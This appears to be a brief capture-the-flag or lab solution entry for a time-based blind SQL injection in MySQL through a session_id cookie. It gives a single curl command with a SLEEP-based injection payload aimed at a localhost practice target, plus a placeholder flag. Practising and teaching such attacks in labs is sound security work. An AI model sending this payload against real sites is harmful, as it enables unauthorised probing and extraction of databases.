# SQLi-033: MySQL Time-based via Cookie

Injection Point: `session_id` cookie

```bash
curl -b "session_id=sess_abc123' AND IF(1=1,SLEEP(2),0)-- -" http://localhost:5033/
```

## 🏁 Flag: `FLAG{...}`
